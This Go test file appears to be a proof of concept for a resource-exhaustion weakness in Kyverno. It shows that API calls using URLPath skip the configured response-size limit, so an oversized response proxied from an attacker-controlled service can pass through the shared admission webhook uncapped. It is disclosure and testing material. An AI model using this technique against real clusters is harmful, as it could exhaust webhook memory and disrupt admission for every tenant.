package apicall

import (
	"context"
	"io"
	"testing"

	"github.com/go-logr/logr"
	kyvernov1 "github.com/kyverno/kyverno/api/kyverno/v1"
)

// fakeRawClient simulates what pkg/clients/dclient/client.go's RawAbsPath does
// in production: `c.rest.Get().RequestURI(path).DoRaw(ctx)`, which reads the
// *entire* upstream response body into memory with client-go's DoRaw, with no
// size cap of its own. This stands in for a urlPath that proxies through the
// apiserver to a resource the attacker influences (e.g. a Service/Pod proxy
// subresource -- URLPath explicitly supports the same paths as
// `kubectl get --raw`, including .../proxy endpoints).
type fakeRawClient struct {
	payload []byte
}

func (f *fakeRawClient) RawAbsPath(ctx context.Context, path string, method string, dataReader io.Reader) ([]byte, error) {
	// DoRaw has no size limit: it hands back whatever the upstream sent.
	return f.payload, nil
}

// TestURLPathAPICallBypassesMaxResponseLength shows that the
// maxAPICallResponseLength budget, which IS enforced for the Service
// (direct-HTTP) branch of apicall.Execute via http.MaxBytesReader
// (executor.go:114), is never even referenced by the URLPath (Kubernetes
// raw API / proxy) branch, executeK8sAPICall. The same kyvernov1.APICall
// struct is configured by any Kyverno ClusterPolicy/Policy/
// GlobalContextEntry author (policy authoring is often delegated to
// namespace admins in multi-tenant clusters) and is evaluated on every
// matching admission request by the shared Kyverno admission webhook pod.
func TestURLPathAPICallBypassesMaxResponseLength(t *testing.T) {
	const oversizeLen = 50 * 1000 * 1000 // 50MB, far above any reasonable per-call budget
	huge := make([]byte, oversizeLen)
	for i := range huge {
		huge[i] = 'A'
	}

	// A tight budget: 1KB. This is what operators configure expecting it
	// to bound EVERY apiCall, regardless of whether it's urlPath- or
	// service-based -- that's the whole point of a shared
	// APICallConfiguration passed into one Executor.
	cfg := NewAPICallConfiguration(1024, 0)

	exec := NewExecutor(logr.Discard(), "poc", &fakeRawClient{payload: huge}, cfg)

	call := &kyvernov1.APICall{
		URLPath: "/api/v1/namespaces/victim-ns/services/attacker-svc:80/proxy/",
		Method:  "GET",
	}

	body, err := exec.Execute(context.Background(), call)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	t.Logf("configured maxAPICallResponseLength = %d bytes", 1024)
	t.Logf("actual bytes returned by Execute()  = %d bytes", len(body))

	if len(body) <= 1024 {
		t.Fatalf("expected the oversized response to pass through uncapped, but got only %d bytes "+
			"-- budget enforcement found where none was expected", len(body))
	}

	if len(body) != oversizeLen {
		t.Fatalf("expected the full %d-byte response to be returned unbounded, got %d", oversizeLen, len(body))
	}

	t.Log("CONFIRMED: a kyvernov1.APICall with URLPath set bypasses " +
		"maxAPICallResponseLength entirely -- executeK8sAPICall never applies " +
		"http.MaxBytesReader (unlike executeServiceCall, which does, at executor.go:114). " +
		"Any policy author able to set context[].apiCall.urlPath to a path that proxies " +
		"to a large/attacker-controlled response (URLPath explicitly supports the same " +
		"paths as `kubectl get --raw`, including Service/Pod .../proxy subresources) can " +
		"make the shared Kyverno admission webhook buffer an unbounded response into memory " +
		"on every matching admission request.")
}
